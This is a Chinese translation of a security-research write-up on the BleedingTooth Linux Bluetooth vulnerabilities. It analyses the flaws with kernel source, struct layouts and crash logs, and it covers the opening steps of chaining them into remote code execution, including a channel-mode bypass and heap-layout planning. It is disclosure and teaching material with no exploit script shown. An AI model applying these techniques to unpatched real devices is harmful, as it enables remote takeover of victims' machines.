[#]: collector: "选题人 Licae"
[#]: translator: "b1lack "
[#]: reviewer: " "
[#]: publisher: " "
[#]: subject: "BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution"
[#]: via: "https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html#bypassing-badkarma"
[#]: author: "Andy Nguyen https://google.github.io/security-research"
[#]: url: " "

BleedingTooth：Linux 蓝牙零点击远程代码执行
=======

# 概述

我注意到网络子系统通过 syzkaller(Google开发的一款内核模糊测试工具) 进行了广泛的模糊测试，但是像蓝牙这样的子系统涉及的比较少。总的来说，关于蓝牙主机攻击的研究似乎相当有限-蓝牙中大多数公开的漏洞只影响[固件](https://www.armis.com/research/bleedingbit/)或自身[规范](https://knobattack.com/)，并且只允许攻击者窃听和/或操纵信息。

但如果攻击者能够完全控制设备呢？最突出的例子是 [BlueBorne ](https://www.armis.com/blueborne/)和 [BlueFrag ](https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/)。我给自己设定的目标是研究 Linux 的蓝牙堆栈，扩展 BlueBorne 的发现，并扩展 syzkaller，使其能够模糊测试 /dev/vhci 设备。

这篇博文描述了我深入研究代码的过程，发现了高危的漏洞，并最终将它们链接到针对 x86-64 Ubuntu 20.04.1（[视频](https://youtu.be/qPYrLRausSw)）的成熟RCE漏洞利用中。

## 补丁，严重性和公告

谷歌直接联系了 [BlueZ](http://www.bluez.org/) 和 Linux 蓝牙子系统维护者（Intel），而不是 Linux 内核安全团队，以协调对这一系列漏洞的多方响应。Intel 随补丁一起发布了安全公告 [INTEL-SA-00435](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00435.html)，但在披露时，这些补丁并未包含在任何已发布的内核版本中。为了便于协调，应该通知 Linux 内核安全团队，并且任何此类将来的漏洞也将报告给他们。通信的时间表位于文章的结尾。相应漏洞的补丁包括：

- [BadVibes](https://github.com/google/security-research/security/advisories/GHSA-ccx2-w2r4-x649) （CVE-2020-24490） 已于 2020 年 7 月 30 日在主线分支上修复：[提交](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=a2ec905d1e160a33b2e210e45ad30445ef26ce0e)。
- [BadChoice](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq) （CVE-2020-12352） 和 [BadKarma](https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq) （CVE-2020-12351） 已于 2020-Sep-25 在 bluetooth-next 上修复：提交 [1](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=eddb7732119d53400f48a02536a84c509692faa8)、[2](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=f19425641cb2572a33cb074d5e30283720bd4d22)、[3](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08)、[4](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b560a208cda0297fef6ff85bbfd58a8f0a52a543)

仅这些漏洞的严重性就有从中到高不等，但它们的组合起来使用意味着严重的安全风险。这篇文章涵盖了这些风险。

## 漏洞

让我们简要描述一下蓝牙堆栈。蓝牙芯片使用 HCI（主机控制器接口）协议与主机（操作系统）通信。常见的数据包有：

- 命令数据包 – 由主机发送到控制器。
- 事件数据包 – 由控制器发送到主机以通知事件。
- 数据包 – 通常携带实现传输层的 L2CAP（逻辑链路控制和适应协议）数据包。

更高级别的协议，如 A2MP（AMP管理器协议）或 SMP（安全管理协议）构建在 L2CAP 之上。在 Linux 实现中，所有这些协议都是在没有身份验证的情况下公开的，其中一些协议甚至存在于内核中，因此这里的漏洞至关重要。

## BadVibes：基于栈的缓冲区溢出 （CVE-2020-24490）

我通过手动查看 HCI 事件数据包解析器发现了第一个漏洞（在 Linux 内核 4.19 中引入）。HCI 事件数据包由蓝牙芯片制作和发送，通常无法由攻击者控制（除非他们也控制蓝牙固件）。但是，这里有两种非常相似的方法 `hci_le_adv_report_evt()` 和 `hci_le_ext_adv_report_evt()` ，其目的是分析来自远程蓝牙设备的广播报文。这些报文的大小是可变的。

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void hci_le_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
    u8 num_reports = skb->data[0];
    void *ptr = &skb->data[1];
    
    hci_dev_lock(hdev);
    
    while (num_reports--) {
        struct hci_ev_le_advertising_info *ev = ptr;
        s8 rssi;
        
        if (ev->length <= HCI_MAX_AD_LENGTH) {
            rssi = ev->data[ev->length];
            process_adv_report(hdev, ev->evt_type, &ev->bdaddr,
                               ev->bdaddr_type, NULL, 0, rssi,
                               ev->data, ev->length);
        } else {
            bt_dev_err(hdev, "Dropping invalid advertising data");
        }
        
        ptr += sizeof(*ev) + ev->length + 1;
    }
    
    hci_dev_unlock(hdev);
}
...
    static void hci_le_ext_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
    u8 num_reports = skb->data[0];
    void *ptr = &skb->data[1];
    
    hci_dev_lock(hdev);
    
    while (num_reports--) {
        struct hci_ev_le_ext_adv_report *ev = ptr;
        u8 legacy_evt_type;
        u16 evt_type;
        
        evt_type = __le16_to_cpu(ev->evt_type);
        legacy_evt_type = ext_evt_type_to_legacy(hdev, evt_type);
        if (legacy_evt_type != LE_ADV_INVALID) {
            process_adv_report(hdev, legacy_evt_type, &ev->bdaddr,
                               ev->bdaddr_type, NULL, 0, ev->rssi,
                               ev->data, ev->length);
        }
        
        ptr += sizeof(*ev) + ev->length;
    }
    
    hci_dev_unlock(hdev);
}
```

注意这两个方法是怎么调用 `process_adv_report()` 的，后一个方法没有检查 `ev->length` 是否小于或等于`HCI_MAX_AD_LENGTH=31`。函数 `process_adv_report()` 接着会传递事件数据和长度参数来调用 `store_pending_adv_report()`：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
			       u8 bdaddr_type, bdaddr_t *direct_addr,
			       u8 direct_addr_type, s8 rssi, u8 *data, u8 len)
{
	...
	if (!has_pending_adv_report(hdev)) {
		...
		if (type == LE_ADV_IND || type == LE_ADV_SCAN_IND) {
			store_pending_adv_report(hdev, bdaddr, bdaddr_type,
						 rssi, flags, data, len);
			return;
		}
		...
	}
	...
}
```

最后，`store_pending_adv_report()` 子例程复制数据到 `d->last_adv_data`：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void store_pending_adv_report(struct hci_dev *hdev, bdaddr_t *bdaddr,
				     u8 bdaddr_type, s8 rssi, u32 flags,
				     u8 *data, u8 len)
{
	struct discovery_state *d = &hdev->discovery;
	...
	memcpy(d->last_adv_data, data, len);
	d->last_adv_data_len = len;
}
```

在`struct hci_dev` 中，我们可以看到缓冲区 `last_adv_data`和 `HCI_MAX_AD_LENGTH`的大小相同，但这都不足以容纳扩展的广播数据。理论上，解析器可以接收 255  字节的数据包并将其路由到该方法。如果可能的话，我们可以溢出 `last_adv_data`并污染参数使得偏移量为`0xbaf`。



```c
// pahole -E -C hci_dev --hex bluetooth.ko
struct hci_dev {
	...
	struct discovery_state {
		...
		/* typedef u8 -> __u8 */ unsigned char      last_adv_data[31];           /* 0xab0  0x1f */
		...
	} discovery; /* 0xa68  0x88 */
	...
	struct list_head {
		struct list_head * next;                                                 /* 0xb18   0x8 */
		struct list_head * prev;                                                 /* 0xb20   0x8 */
	} mgmt_pending; /* 0xb18  0x10 */
	...
	/* size: 4264, cachelines: 67, members: 192 */
	/* sum members: 4216, holes: 17, sum holes: 48 */
	/* paddings: 10, sum paddings: 43 */
	/* forced alignments: 1 */
	/* last cacheline: 40 bytes */
} __attribute__((__aligned__(8)));
```

但是，`hci_le_ext_adv_report_evt()`是否可以接收这么大的报文？数据量大的报文似乎是符合预期的，因为拓展的报文解析器似乎有意删除了 31 字节的检测。另外，它在代码中与 `hci_le_adv_report_evt()`很相似，因此该检测可能不是因为错误而被遗忘。事实上，从规范中我们可以看到，从 31 字节扩展到 255 字节是蓝牙 5 的主要特性之一：

> 回顾蓝牙 4.0，广播的有效载荷最大长度为 31 字节。在蓝牙 5 中，我们通过增加额外的广播通道和新的广播 PDUs将有效负载增加到 255 字节。
>
> 来源： https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/

因此，只有当受害者的机器带有蓝牙 5 芯片（这是一种相对“新”的技术，仅在较新的笔记本电脑上可用），并且受害者正在主动扫描广播数据（即打开蓝牙设置并搜索周围的设备）时，该漏洞才会触发。

使用两个支持蓝牙 5 的设备，我们可以很容易地确认该漏洞，并观察到类似于如下的 panic：

```c
[  118.490999] general protection fault: 0000 [#1] SMP PTI
[  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
[  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  118.491034] Workqueue: hci0 hci_rx_work [bluetooth]
[  118.491056] RIP: 0010:hci_bdaddr_list_lookup+0x1e/0x40 [bluetooth]
[  118.491060] Code: ff ff e9 26 ff ff ff 0f 1f 44 00 00 0f 1f 44 00 00 55 48 8b 07 48 89 e5 48 39 c7 75 0a eb 24 48 8b 00 48 39 f8 74 1c 44 8b 06 <44> 39 40 10 75 ef 44 0f b7 4e 04 66 44 39 48 14 75 e3 38 50 16 75
[  118.491062] RSP: 0018:ffffbc6a40493c70 EFLAGS: 00010286
[  118.491066] RAX: 4141414141414141 RBX: 000000000000001b RCX: 0000000000000000
[  118.491068] RDX: 0000000000000000 RSI: ffff9903e76c100f RDI: ffff9904289d4b28
[  118.491070] RBP: ffffbc6a40493c70 R08: 0000000093570362 R09: 0000000000000000
[  118.491072] R10: 0000000000000000 R11: ffff9904344eae38 R12: ffff9904289d4000
[  118.491074] R13: 0000000000000000 R14: 00000000ffffffa3 R15: ffff9903e76c100f
[  118.491077] FS:  0000000000000000(0000) GS:ffff990434580000(0000) knlGS:0000000000000000
[  118.491079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  118.491081] CR2: 00007feed125a000 CR3: 00000001b860a003 CR4: 00000000003606e0
[  118.491083] Call Trace:
[  118.491108]  process_adv_report+0x12e/0x560 [bluetooth]
[  118.491128]  hci_le_meta_evt+0x7b2/0xba0 [bluetooth]
[  118.491134]  ? __wake_up_sync_key+0x1e/0x30
[  118.491140]  ? sock_def_readable+0x40/0x70
[  118.491143]  ? __sock_queue_rcv_skb+0x142/0x1f0
[  118.491162]  hci_event_packet+0x1c29/0x2a90 [bluetooth]
[  118.491186]  ? hci_send_to_monitor+0xae/0x120 [bluetooth]
[  118.491190]  ? skb_release_all+0x26/0x30
[  118.491207]  hci_rx_work+0x19b/0x360 [bluetooth]
[  118.491211]  ? __schedule+0x2eb/0x740
[  118.491217]  process_one_work+0x1eb/0x3b0
[  118.491221]  worker_thread+0x4d/0x400
[  118.491225]  kthread+0x104/0x140
[  118.491229]  ? process_one_work+0x3b0/0x3b0
[  118.491232]  ? kthread_park+0x90/0x90
[  118.491236]  ret_from_fork+0x35/0x40
```

这个 panic 意味着我们可以完全控制`struct hci_dev`成员变量。`mgmt_pending->next`是一个可被污染的有趣指针，因为它是类型是 `struct mgmt_pending_cmd`，其中包含函数指针 `cmd_complete()`：

```c
// pahole -E -C mgmt_pending_cmd --hex bluetooth.ko
struct mgmt_pending_cmd {
	...
	int                        (*cmd_complete)(struct mgmt_pending_cmd *, u8);       /*  0x38   0x8 */

	/* size: 64, cachelines: 1, members: 8 */
	/* sum members: 62, holes: 1, sum holes: 2 */
};
```

举个例子，可以通过中止 HCI 连接来触发此处理程序。但是，为了成功重定向到`mgmt_pending->next`指针，我们需要一个额外的信息泄漏漏洞，我们将在下一节中学习。

## BadChoice: 基于堆栈的信息泄漏 (CVE-2020-12352)

BadVibes 漏洞还不够强大，不能被转化成任意的读/写操作，而且似乎没有办法使用它来泄漏受害者的内存布局。原因是唯一可能被污染的成员是指向了循环列表的指针。顾名思义，这些数据结构是循环的，因此，如果不能确保它们最终指向开始的地方，我们就无法更改它们。当受害者的内存布局是随机的时候，很难满足这一要求。虽然内核中有一些资源是在静态地址上分配的，但它们的内容很可能是不可控的。因此，为了利用 BadVibes ，我们首先需要了解内存布局。更具体地说，我们需要泄漏受害者的一些内存地址，我们可以控制或至少预测其内容。

通常来说，信息泄漏是通过利用越界访问、未初始化变量、或者最近流行的侧信道/定时攻击来实现。后者可能很难实现，因为传输可能有抖动。相反，让我们重点关注前两个 bug 类，遍历所有可以将信息返回给攻击者的子例程，查看它们中是否存在泄露越界数据或未初始化的内存。

通过遍历所有`a2mp_send()`调用，我在 A2MP 协议的`A2MP_GETINFO_REQ`命令中发现了第二个漏洞。这个漏洞从 Linux 3.6 内核开始就已经存在，在默认启用`CONFIG_BT_HS=y` 时是可以被利用的。

让我们来分析子例程`a2mp_getinfo_req()`是如何被`A2MP_GETINFO_REQ`命令调用的：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_req *req  = (void *) skb->data;
	...
	hdev = hci_dev_get(req->id);
	if (!hdev || hdev->dev_type != HCI_AMP) {
		struct a2mp_info_rsp rsp;

		rsp.id = req->id;
		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
			  &rsp);

		goto done;
	}
	...
}
```

该子例程旨在使用 HCI 设备 id 请求有关 AMP 控制器的信息。但是，如果它是无效的或者不是 HCI_AMP 类型的，则返回一个错误的路径，这意味着受害者向我们返回`A2MP_STATUS_INVALID_CTRL_ID`的状态。遗憾的是，结构`a2mp_info_rsp`包含的成员不仅仅是 id 和状态，正如我们所看到的，响应结构没有完全初始化。因此，16个字节的内核堆栈可能被泄露给攻击者，其中可能包含受害者的敏感数据：

```c
// pahole -E -C a2mp_info_rsp --hex bluetooth.ko
struct a2mp_info_rsp {
	/* typedef __u8 */ unsigned char              id;                                /*     0   0x1 */
	/* typedef __u8 */ unsigned char              status;                            /*   0x1   0x1 */
	/* typedef __le32 -> __u32 */ unsigned int               total_bw;               /*   0x2   0x4 */
	/* typedef __le32 -> __u32 */ unsigned int               max_bw;                 /*   0x6   0x4 */
	/* typedef __le32 -> __u32 */ unsigned int               min_latency;            /*   0xa   0x4 */
	/* typedef __le16 -> __u16 */ short unsigned int         pal_cap;                /*   0xe   0x2 */
	/* typedef __le16 -> __u16 */ short unsigned int         assoc_size;             /*  0x10   0x2 */

	/* size: 18, cachelines: 1, members: 7 */
	/* last cacheline: 18 bytes */
} __attribute__((__packed__));
```

可以通过在发送`A2MP_GETINFO_REQ`之前发送有趣的命令填充堆栈帧来利用这个漏洞。在这里，有趣的命令是指那些将指针放在`a2mp_getinfo_req()`重用的同一堆栈帧中的命令。通过这样做，未初始化的变量可能最终包含先前压入堆栈的指针。

注意，使用`CONFIG_INIT_STACK_ALL_PATTERN=y`编译的内核不太容易受到这种攻击。例如，在 ChromeOS 上， BadChoice 只返回 0xAA 。然而，在流行的 Linux 发行版中，这个选项似乎没有默认启用。

## BadKarma:基于堆类型的混淆（CVE-2020-12351）

我在尝试触发 BadChoice 并确认其可利用性时发现了第三个漏洞。也就是说，受害者的机器意外地崩溃了，调用跟踪如下：

```c
[  445.440736] general protection fault: 0000 [#1] SMP PTI
[  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
[  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  445.440764] Workqueue: hci0 hci_rx_work [bluetooth]
[  445.440771] RIP: 0010:sk_filter_trim_cap+0x6d/0x220
[  445.440773] Code: e8 18 e1 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 4c 8b 78 18 48 89 4d b0 <41> f6 47 02 08 0f 85 41 01 00 00 0f 1f 44 00 00 49 8b 47 30 49 8d
[  445.440776] RSP: 0018:ffffa86b403abca0 EFLAGS: 00010286
[  445.440778] RAX: ffffffffc071cc50 RBX: ffff8e95af6d7000 RCX: 0000000000000000
[  445.440780] RDX: 0000000000000000 RSI: ffff8e95ac533800 RDI: ffff8e95af6d7000
[  445.440781] RBP: ffffa86b403abd00 R08: ffff8e95b452f0e0 R09: ffff8e95b34072c0
[  445.440782] R10: ffff8e95acd57818 R11: ffff8e95b456ae38 R12: ffff8e95ac533800
[  445.440784] R13: 0000000000000000 R14: 0000000000000001 R15: 30478b4800000208
[  445.440786] FS:  0000000000000000(0000) GS:ffff8e95b4500000(0000) knlGS:0000000000000000
[  445.440788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  445.440789] CR2: 000055f371aa94a8 CR3: 000000022dc0a005 CR4: 00000000003606e0
[  445.440791] Call Trace:
[  445.440817]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[  445.440838]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[  445.440857]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[  445.440875]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[  445.440878]  ? skb_release_all+0x26/0x30
[  445.440896]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[  445.440914]  hci_rx_work+0x186/0x360 [bluetooth]
[  445.440919]  process_one_work+0x1eb/0x3b0
[  445.440921]  worker_thread+0x4d/0x400
[  445.440924]  kthread+0x104/0x140
[  445.440927]  ? process_one_work+0x3b0/0x3b0
[  445.440929]  ? kthread_park+0x90/0x90
[  445.440932]  ret_from_fork+0x35/0x40
```

查看`l2cap_data_rcv()`，我们可以看到当使用 ERTM （增强重传模式）或流模式（类似于 TCP ）时，会调用`sk_filter()`:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
	...
	if ((chan->mode == L2CAP_MODE_ERTM ||
	     chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
		goto drop;
	...
}
```

这确实是 A2MP 通道的情况（通道可以与网口进行比较）：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
	struct l2cap_chan *chan;
	int err;

	chan = l2cap_chan_create();
	if (!chan)
		return NULL;
	...
	chan->mode = L2CAP_MODE_ERTM;
	...
	return chan;
}
...
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
	struct amp_mgr *mgr;
	struct l2cap_chan *chan;

	mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
	if (!mgr)
		return NULL;
	...
	chan = a2mp_chan_open(conn, locked);
	if (!chan) {
		kfree(mgr);
		return NULL;
	}

	mgr->a2mp_chan = chan;
	chan->data = mgr;
	...
	return mgr;
}
```

Looking at amp_mgr_create(), it is clear where the mistake is. Namely, chan->data is of the type struct amp_mgr, whereas sk_filter() takes an argument of the type struct sock, meaning that we have a remote type confusion by design. This confusion was introduced in Linux kernel 4.8 and since then has remained unchanged.

查看 `amp_mgr_create()`，可以清楚地看到错误在哪里。也就是说，`chan->data`属于类型 `struct amp_mgr`，而`sk_filter()`接受类型`struct sock`的参数，这意味着我们在设计上存在远程类型混淆。这种混淆是在 Linux 内核 4.8 中引入的，此后一直没有改变。

# 利用

BadChoice 漏洞可以与 BadVibes 、BadKarma 链接以实现 RCE 。在这篇博客中，我们将只关注使用 BadKarma 的方法，原因如下:

- 不限于蓝牙 5 。
- 不需要受害者进行扫描。
- 可以对特定设备进行有针对性的攻击。

另一方面，BadVibes 攻击只针对广播，因此只有一台机器可以被成功利用，而其他所有机器侦听相同的消息时只会崩溃。

## 绕过 BadKarma

讽刺的是，为了利用 BadKarma ，我们首先必须摆脱 BadKarma 。回想一下，在设计上存在一个类型混淆错误，只要 A2MP 通道被配置为 ERTM/流模式，我们就无法通过 `l2cap_data_rcv()`到达 A2MP 子例程，而不触发`sk_filter()`中的 panic。

查看 `l2cap_data_channel()`，我们可以看到采用不同路由的唯一可能方法是将通道模式重新配置为`L2CAP_MODE_BASIC`。这将“基本上”允许我们直接调用 A2MP 接收处理器：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
			       struct sk_buff *skb)
{
	struct l2cap_chan *chan;

	chan = l2cap_get_chan_by_scid(conn, cid);
	...
	switch (chan->mode) {
	...
	case L2CAP_MODE_BASIC:
		/* If socket recv buffers overflows we drop data here
		 * which is *bad* because L2CAP has to be reliable.
		 * But we don't have any other choice. L2CAP doesn't
		 * provide flow control mechanism. */

		if (chan->imtu < skb->len) {
			BT_ERR("Dropping L2CAP data: receive buffer overflow");
			goto drop;
		}

		if (!chan->ops->recv(chan, skb))
			goto done;
		break;

	case L2CAP_MODE_ERTM:
	case L2CAP_MODE_STREAMING:
		l2cap_data_rcv(chan, skb);
		goto done;
	...
	}
	...
}
```



然而，是否可以重新配置信道模式呢？根据规范，A2MP 通道必须使用 ERTM 或流模式:

> 蓝牙核心通过对在 AMP 上使用的任何 L2CAP 通道强制使用增强重传模式或流模式来维护高于核心的协议和配置文件的可靠性。
>
> 来源：https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=421043

由于某些原因，这个事实在规范中没有描述，而 Linux 的实现实际上允许我们通过在`L2CAP_CONF_UNACCEPT`配置响应中封装所需的通道模式来从任何通道模式切换到`L2CAP_MODE_BASIC`:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c`
static inline int l2cap_config_rsp(struct l2cap_conn *conn,
				   struct l2cap_cmd_hdr *cmd, u16 cmd_len,
				   u8 *data)
{
	struct l2cap_conf_rsp *rsp = (struct l2cap_conf_rsp *)data;
	...
	scid   = __le16_to_cpu(rsp->scid);
	flags  = __le16_to_cpu(rsp->flags);
	result = __le16_to_cpu(rsp->result);
	...
	chan = l2cap_get_chan_by_scid(conn, scid);
	if (!chan)
		return 0;

	switch (result) {
	...
	case L2CAP_CONF_UNACCEPT:
		if (chan->num_conf_rsp <= L2CAP_CONF_MAX_CONF_RSP) {
			...
			result = L2CAP_CONF_SUCCESS;
			len = l2cap_parse_conf_rsp(chan, rsp->data, len,
						   req, sizeof(req), &result);
			...
		}
		fallthrough;
	...
	}
	...
}
```

这个函数调用子例程`l2cap_parse_conf_rsp()`。在这里，如果指定了选项类型`L2CAP_CONF_RFC`，并且当前的通道模式不是`L2CAP_MODE_BASIC`，那么可以将其更改为我们想要的：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
				void *data, size_t size, u16 *result)
{
	...
	while (len >= L2CAP_CONF_OPT_SIZE) {
		len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
		if (len < 0)
			break;

		switch (type) {
		...
		case L2CAP_CONF_RFC:
			if (olen != sizeof(rfc))
				break;
			memcpy(&rfc, (void *)val, olen);
			...
			break;
		...
		}
	}

	if (chan->mode == L2CAP_MODE_BASIC && chan->mode != rfc.mode)
		return -ECONNREFUSED;

	chan->mode = rfc.mode;
	...
}
```

这里自然会有这样的问题：我们是否需要先从受害者那里接收配置请求，然后才能发回配置响应？这似乎是协议的一个弱点——答案是否定的。此外，无论受害者与我们协商什么，我们都可以返回一个`L2CAP_CONF_UNACCEPT`响应，受害者会很高兴地接受我们的建议。

使用配置响应旁路，我们现在能够访问 A2MP 命令并利用 BadChoice 检索所需的所有信息（请参阅后面的部分）。一旦我们准备触发类型混淆，我们可以简单地通过断开和连接通道来重新创建 A2MP 通道，并按照 BadKarma 的要求将通道模式设置回 ERTM 。

## 探索 sk_filter ()

正如我们所理解的，BadKarma 的问题在于一个`struct amp_mgr`对象被传递给了`sk_filter()`，而一个`struct sock`对象则被期望传递给`sk_filter()` 。换句话说，`struct sock`中的字段错误地映射到`struct amp_mgr`中的字段。因此，这可能会导致对无效指针的解引用，并最终导致 panic  。回顾之前的 panic 日志，这正是发生的事情，也是发现 BadKarma 的主要原因。

我们是否可以控制指针解引用，或者控制`struct amp_mgr`中的其他成员来影响`sk_filter()`的代码流？让我们看看`sk_filter()`并跟踪`struct sock *sk`的使用，以了解在这个子例程中哪些成员是相关的。

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
static inline int sk_filter(struct sock *sk, struct sk_buff *skb)
{
	return sk_filter_trim_cap(sk, skb, 1);
}
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
	int err;
	struct sk_filter *filter;

	/*
	 * If the skb was allocated from pfmemalloc reserves, only
	 * allow SOCK_MEMALLOC sockets to use it as this socket is
	 * helping free memory
	 */
	if (skb_pfmemalloc(skb) && !sock_flag(sk, SOCK_MEMALLOC)) {
		NET_INC_STATS(sock_net(sk), LINUX_MIB_PFMEMALLOCDROP);
		return -ENOMEM;
	}
	err = BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb);
	if (err)
		return err;

	err = security_sock_rcv_skb(sk, skb);
	if (err)
		return err;

	rcu_read_lock();
	filter = rcu_dereference(sk->sk_filter);
	if (filter) {
		struct sock *save_sk = skb->sk;
		unsigned int pkt_len;

		skb->sk = sk;
		pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
		skb->sk = save_sk;
		err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
	}
	rcu_read_unlock();

	return err;
}
```

`sk`的第一次使用是在`sock_flag()`中，尽管该函数只是检查一些标志，而且只有在`skb_pfmemalloc()`返回 true 时才会发生。相反，让我们看看`BPF_CGROUP_RUN_PROG_INET_INGRESS()`，看看它对套接字结构做了什么：

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf-cgroup.h
#define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)			      \
({									      \
	int __ret = 0;							      \
	if (cgroup_bpf_enabled)						      \
		__ret = __cgroup_bpf_run_filter_skb(sk, skb,		      \
						    BPF_CGROUP_INET_INGRESS); \
									      \
	__ret;								      \
})
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/cgroup.c
int __cgroup_bpf_run_filter_skb(struct sock *sk,
				struct sk_buff *skb,
				enum bpf_attach_type type)
{
	...
	if (!sk || !sk_fullsock(sk))
		return 0;

	if (sk->sk_family != AF_INET && sk->sk_family != AF_INET6)
		return 0;
	...
}
```

类似地，`sk_fullsock()`也会检查一些标志，但不会执行任何有趣的操作。进一步，注意 `sk->sk_family` 必须是 `AF_INET=2` 或` AF_INET6=10` 才能继续。这个字段位于 `struct sock` 中 0x10 的偏移量:

```c
// pahole -E -C sock --hex bluetooth.ko
struct sock {
	struct sock_common {
		...
		short unsigned int skc_family;                                           /*  0x10   0x2 */
		...
	} __sk_common; /*     0  0x88 */
	...
	struct sk_filter *         sk_filter;                                            /* 0x110   0x8 */
	...
	/* size: 760, cachelines: 12, members: 88 */
	/* sum members: 747, holes: 4, sum holes: 8 */
	/* sum bitfield members: 40 bits (5 bytes) */
	/* paddings: 1, sum paddings: 4 */
	/* forced alignments: 1 */
	/* last cacheline: 56 bytes */
} __attribute__((__aligned__(8)));
```

查看 `struct amp_mgr` 中的偏移量 0x10 ，我们意识到该字段映射到 `struct l2cap_conn` 指针:

```c
// pahole -E -C amp_mgr --hex bluetooth.ko
struct amp_mgr {
	...
	struct l2cap_conn *        l2cap_conn;                                           /*  0x10   0x8 */
	...
	/* size: 112, cachelines: 2, members: 11 */
	/* sum members: 110, holes: 1, sum holes: 2 */
	/* last cacheline: 48 bytes */
};
```

由于这是一个指向与分配大小（最小32字节）对齐的堆对象的指针，这意味着该指针的较低字节不能有 `__cgroup_bpf_run_filter_skb()` 所要求的值 2 或 10 。经查实，我们知道子例程总是返回 0 ，无论其他字段的值是什么。类似地，子例程 `security_sock_rcv_skb()` 要求相同的条件，否则返回0。

这使得 `sk->sk_filter` 成为惟一可能被污染的成员。稍后我们将看到控制结构 `sk_filter` 是多么有用，但首先要注意， `sk_filter` 位于偏移量 0x110 ，而结构 `amp_mgr` 的大小只有 112=0x70 字节。这不是我们无法控制的吗？答案是未知的 —— 通常它不在我们的控制范围内，但是如果我们有方法来构造堆，那么完全控制指针可能会更容易。具体来说，结构 `amp_mgr` 的大小为 112 字节（在 65 到 128 之间），因此它是在 `kmalloc-128 slab` 中分配的。通常， slab 中的内存块不包含元数据，比如前面的块头，因为目标是最小化碎片。因此，内存块是连续的，为了控制指针在偏移量 0x110 处，我们必须实现一个堆群，其中我们想要的指针位于结构 `amp_mgr` 之后的第二个块中偏移量 0x10 的位置。

## 寻找堆原语

